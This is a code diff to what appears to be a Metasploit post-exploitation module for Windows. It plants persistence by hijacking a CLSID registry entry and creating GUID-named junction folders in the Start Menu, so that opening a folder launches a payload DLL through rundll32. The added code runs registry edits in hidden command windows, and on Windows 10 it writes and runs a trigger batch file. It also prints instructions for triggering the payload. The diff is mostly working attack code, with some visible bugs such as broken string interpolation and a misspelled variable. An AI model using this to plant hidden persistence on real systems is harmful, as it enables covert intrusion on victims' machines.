@@ -104,8 +104,8 @@ class MetasploitModule < Msf::Post
                                         'special thanks: browninfosecguy | betto(ssa)', # module debug help
                                 ],
  
-                        'Version'        => '$Revision: 1.4',
-                        'DisclosureDate' => 'jun 2 2018',
+                        'Version'        => '$Revision: 1.5',
+                        'DisclosureDate' => 'jun 4 2018',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false',   # thats no need for privilege escalation..
@@ -241,124 +241,168 @@ def run
       return nil
     end
 
-    #
-    # check if file/appl exists remote (APPL_PATH)
-    #
-    print_status("check if APPL exists in target ..")
-    if session.fs.file.exist?(app_path)
-      print_status("Application (payload) found ..")
-    else
-      print_error("Not found: #{app_path}")
-      print_warning("Deploy your [payload] before using this module ..")
-      print_warning("OR point to one existing application full path ..")
-      print_line("")
-      Rex::sleep(1.0)
-      return nil
-    end
-
-
       #
-      # GATHER INFO ABOUT TARGET SYSTEM .
-      # store %AppData% directory full path ..
-      print_status("Retriving %AppData% full path ..")
-      Rex::sleep(1.0)
-      data = client.fs.file.expand_path("%AppData%")
-      # store username into a variable
-      print_status("Retriving target %username% ..")
-      Rex::sleep(1.0)
-      user_name =  client.fs.file.expand_path("%username%")
-      # create new GUID and store it in a variable
-      print_status("Creating new GUID value ..")
-      Rex::sleep(1.0)
-      rep_GUID = cmd_exec("powershell.exe -ep -C \"[guid]::NewGuid().Guid\"")
-      print_good("New GUID  : #{rep_GUID}")
-      # add parentesis to GUID value
-      new_GUID = "{#{rep_GUID}}"
-      Rex::sleep(1.0)
-
-
-#
-# List of registry keys to add to target regedit .. (rundll32.exe payload.dll,main)
-#
-if datastore['PERSIST_EXPLORER'] == true || datastore['RENAME_PERSIST'] == true
-  print_warning("Persistence mode sellected")
-  dll_exe = "rundll32.exe #{app_path},main"
-  r = session.sys.process.execute("cmd.exe /c REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d \"#{dll_exe}\" /f", nil, {'Hidden' => true, 'Channelized' => true})
-  r = session.sys.process.execute("cmd.exe /c REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f", nil, {'Hidden' => true, 'Channelized' => true})
-  r = session.sys.process.execute("cmd.exe /c REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d \"Apartment\" /f", nil, {'Hidden' => true, 'Channelized' => true})
-  r = session.sys.process.execute("cmd.exe /c REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder /v Attributes /t REG_DWORD /d \"0xf090013d\" /f", nil, {'Hidden' => true, 'Channelized' => true})
-  r = session.sys.process.execute("cmd.exe /c REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d /f", nil, {'Hidden' => true, 'Channelized' => true})
-  r.channel.close
-  r.close
-else
-  #
-  # DEMO mode (user inputs)
-  #
-  print_status("Demonstration mode sellected")
-  r = session.sys.process.execute("cmd.exe /c REG ADD #{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d \"#{app_path}\" /f", nil, {'Hidden' => true, 'Channelized' => true})
-  r.channel.close
-  r.close
-end
-
-         #
-         # build POC folder (junction shell folders)
-         #
-         if datastore['PERSIST_EXPLORER'] == true
-           folder_poc ="#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC"
-           print_status("Creating junction shell folder ..")
-           Rex::sleep(1.0)
-           cmd_exec("cmd.exe /R mkdir \"#{folder_poc}.#{new_GUID}\"")
-         elsif datastore['RENAME_PERSIST'] == true
-           ren_per = "#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories"
-           print_status("Creating junction shell folder ..")
-           Rex::sleep(1.0)
-           cmd_exec("cmd.exe /R rename \"#{ren_per} #{ren_per}.{new_GUID}\"")
-         else
-           print_status("Creating junction shell folder ..")
-           Rex::sleep(1.0)
-           cmd_exec("cmd.exe /R mkdir \"#{fol_path}.#{new_GUID}\"")
-         end
-
-
-         #
-         # create cleaner resource file [local PC]
-         #
-         print_status("Writing cleaner resource file ..")
-         Rex::sleep(1.0)
-           rand = Rex::Text.rand_text_alpha(8)
-           loot_folder = datastore['LOOT_FOLDER']
-           File.open("#{loot_folder}/#{rand}.rc", "w") do |f|
-           f.write("reg deletekey -k HKCU\\\\Software\\\\Classes\\\\CLSID\\\\#{new_GUID}")
-           f.close
-         end
-
-
+      # check if file/appl exists remote (APPL_PATH)
+      #
+      print_status("check if APPL exists in target ..")
+      if session.fs.file.exist?(app_path)
+        print_status("Application (payload) found ..")
+      else
+        print_error("Not found: #{app_path}")
+        print_warning("Deploy your [payload] before using this module ..")
+        print_warning("OR point to one existing application full path ..")
+        print_line("")
+        Rex::sleep(1.0)
+        return nil
+      end
 
 
        #
-       # exploit finished (print info on screen)..
-       #
+       # GATHER INFO ABOUT TARGET SYSTEM .
+       # store %AppData% directory full path ..
+       print_status("Retriving %AppData% full path ..")
        Rex::sleep(1.0)
-       if datastore['PERSIST_EXPLORER'] == true
-         print_line("---------------------------------------------------")
-         print_line("Trigger exploit: #{folder_poc}")
-         print_line("")
-         print_line("Resource file  : #{loot_folder}/#{rand}.rc")
-         print_line("---------------------------------------------------")
-       elsif datastore['RENAME_PERSIST'] == true
-         print_line("---------------------------------------------------")
-         print_line("Trigger exploit: #{ren_per}")
-         print_line("")
-         print_line("Resource file  : #{loot_folder}/#{rand}.rc")
-         print_line("Rename folder  : cmd.exe /c rename #{ren_per}.{new_GUID} #{ren_per}")
-         print_line("---------------------------------------------------")
+       data = client.fs.file.expand_path("%AppData%")
+       # store username into a variable
+       print_status("Retriving target %username% ..")
+       Rex::sleep(1.0)
+       user_name =  client.fs.file.expand_path("%username%")
+       # create new GUID and store it in a variable
+       print_status("Creating new GUID value ..")
+       Rex::sleep(1.0)
+       rep_GUID = cmd_exec("powershell.exe -ep -C \"[guid]::NewGuid().Guid\"")
+       print_good("New GUID  : #{rep_GUID}")
+       # add parentesis to GUID value
+       new_GUID = "{#{rep_GUID}}"
+       Rex::sleep(1.0)
+
+
+        #
+        # List of registry keys to add to target regedit .. (rundll32.exe payload.dll,main)
+        #
+        if datastore['PERSIST_EXPLORER'] == true || datastore['RENAME_PERSIST'] == true
+          print_status("Persistance mode sellected")
+          dll_exe = "rundll32 #{app_path},main"
+          Rex::sleep(1.0)
+          hacks = [
+            'REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{dll_exe} /f',
+            'REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f',
+            'REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment /f',
+            'REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder Attributes /t REG_DWORD /d 0xf090013d /f',
+            'REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder HideOnDesktop /t REG_SZ /d /f',
+            'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
+          ]
+        else
+          #
+          # DEMO mode (user inputs)
+          #
+          print_status("Demonstration mode sellected")
+          Rex::sleep(1.0)
+            hacks = [
+              'REG ADD #{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d #{app_path} /f',
+              'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
+            ]
+        end
+
+
+       #
+       # my windows10 does not allow me to manipulate regedit
+       # so i have decided to write a bat and remote execute it
+       #
+       if sysinfo['OS'] =~ /Windows 10/
+         print_warning("system: #{sysnfo['Computer']}")
+         print_line("-------------------------------------------------------")
+         print_line("Because of remote registry manipulation restrictions!")
+         print_line("This module write/exec trigger.bat in target %tmp% folder")
+         print_line("-------------------------------------------------------")
+           File.open("%tmp%\\trigger.bat", "w") do |f|
+           f.write("REG ADD #{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d #{app_path} /f")
+           f.close
+           end
+         cmd_exec("%tmp%\\trigger.bat")
+         Rex::sleep(2.0)
        else
-         print_line("---------------------------------------------------")
-         print_line("Trigger exploit: #{fol_path}")
-         print_line("")
-         print_line("Resource file  : #{loot_folder}/#{rand}.rc")
-         print_line("---------------------------------------------------")
+         #
+         # LOOP funtion (not windows10)
+         #
+         session.response_timeout=120
+         hacks.each do |cmd|
+            begin
+              # execute cmd prompt in a hidden channelized windows
+              r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
+              print_line("    Hijack: #{cmd}")
+ 
+                # close client channel when done
+                while(d = r.channel.read)
+                        break if d == ""
+                end
+                r.channel.close
+                r.close
+              # error exception funtion
+              rescue ::Exception => e
+              print_error(" Error Running Command: #{e.class} #{e}")
+            end
+         end
        end
+
+
+       #
+       # build POC folder (junction shell folders)
+       #
+       if datastore['PERSIST_EXPLORER'] == true
+         folder_poc ="#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC"
+         print_status("Creating junction shell folder ..")
+         Rex::sleep(1.0)
+         cmd_exec("cmd.exe /R mkdir \"#{folder_poc}.#{new_GUID}\"")
+       elsif datastore['RENAME_PERSIST'] == true
+         ren_per = "#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories"
+         print_status("Creating junction shell folder ..")
+         Rex::sleep(1.0)
+         cmd_exec("cmd.exe /R rename \"#{ren_per} #{ren_per}.{new_GUID}\"")
+       else
+         print_status("Creating junction shell folder ..")
+         Rex::sleep(1.0)
+         cmd_exec("cmd.exe /R mkdir \"#{fol_path}.#{new_GUID}\"")
+       end
+
+
+     #
+     # create cleaner resource file [local PC]
+     #
+     print_status("Writing cleaner resource file ..")
+     Rex::sleep(1.0)
+       rand = Rex::Text.rand_text_alpha(8)
+       loot_folder = datastore['LOOT_FOLDER']
+       File.open("#{loot_folder}/#{rand}.rc", "w") do |f|
+       f.write("reg deletekey -k HKCU\\\\Software\\\\Classes\\\\CLSID\\\\#{new_GUID}")
+       f.close
+     end
+
+
+  #
+  # exploit finished (print info on screen)..
+  #
+  Rex::sleep(1.0)
+  if datastore['PERSIST_EXPLORER'] == true
+    print_line("---------------------------------------------------")
+    print_line("Trigger exploit: #{folder_poc}")
+    print_line("")
+    print_line("Resource file  : #{loot_folder}/#{rand}.rc")
+    print_line("---------------------------------------------------")
+  elsif datastore['RENAME_PERSIST'] == true
+    print_line("---------------------------------------------------")
+    print_line("Trigger exploit: #{ren_per}")
+    print_line("")
+    print_line("Resource file  : #{loot_folder}/#{rand}.rc")
+    print_line("Rename folder  : cmd.exe /c rename #{ren_per}.{new_GUID} #{ren_per}")
+    print_line("---------------------------------------------------")
+  else
+    print_line("---------------------------------------------------")
+    print_line("Trigger exploit: #{fol_path}")
+    print_line("")
+    print_line("Resource file  : #{loot_folder}/#{rand}.rc")
+    print_line("---------------------------------------------------")
+  end
 
 
    #
